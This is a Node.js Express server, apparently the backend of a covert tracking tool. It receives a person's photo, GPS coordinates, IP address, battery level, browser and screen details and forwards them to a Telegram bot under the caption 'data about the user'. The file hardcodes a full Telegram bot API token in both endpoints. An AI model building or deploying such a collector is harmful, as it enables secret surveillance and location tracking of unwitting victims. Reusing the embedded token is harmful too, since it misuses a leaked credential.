import express from 'express';
import axios from 'axios';
import FormData from 'form-data';
import cors from 'cors';
import multer from 'multer';
import ip from 'express-ip';

const app = express();
const PORT = 5000;

app.set('trust proxy', true); // Устанавливаем для Express доверие к прокси-серверу

app.use(ip().getIpInfoMiddleware); // Используем middleware для получения информации об IP адресе

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(express.json());
app.use(cors());

app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
  const { chat_id, batteryLevel, deviceInfo } = req.body;
  const photo = req.file;

  if (!photo) {
    return res.status(400).send('No file uploaded');
  }

  try {
    const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;

    const apiUrl = `https://api.telegram.org/bot6725080038:AAEvI3bcOSsc0V8QTtcFvFPQ1yBOvyw0oNs/sendPhoto`; // Замените <YOUR_BOT_TOKEN> на ваш токен бота

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('photo', photo.buffer, {
      filename: photo.originalname,
      contentType: photo.mimetype,
      knownLength: photo.size,
    });

    const caption = `Данные о пользователе:\n\n` +
                    `🔋 Уровень батареи: ${batteryLevel}\n\n` +
                    `📍 IP Address: ${userIP}\n\n` +
                    `🌐 Browser: ${req.headers['user-agent']}\n\n` +
                    `📱 Тип устройства: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
                    `🖥 Платформа: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
                    `📏 Разрешение экрана: ${req.headers['screen-width']}x${req.headers['screen-height']}`;

    formData.append('caption', caption);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    console.log('Photo sent to Telegram:', response.data);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending photo to Telegram:', error);
    res.status(500).send('Error sending photo to Telegram');
  }
});


app.post('/sendLocationToTelegram', async (req, res) => {
  const { chat_id, latitude, longitude } = req.body;

  try {
    const userIP = req.headers['x-forwarded-for'] || req.ipInfo.clientIp;

    const apiUrl = `https://api.telegram.org/bot6725080038:AAEvI3bcOSsc0V8QTtcFvFPQ1yBOvyw0oNs/sendLocation`;

    const formData = new FormData();
    formData.append('chat_id', chat_id);
    formData.append('latitude', latitude);
    formData.append('longitude', longitude);

    const response = await axios.post(apiUrl, formData, {
      headers: {
        ...formData.getHeaders(),
      },
    });

    console.log('Location sent to Telegram:', response.data);
    res.sendStatus(200);
  } catch (error) {
    console.error('Error sending location to Telegram:', error);
    res.status(500).send('Error sending location to Telegram');
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
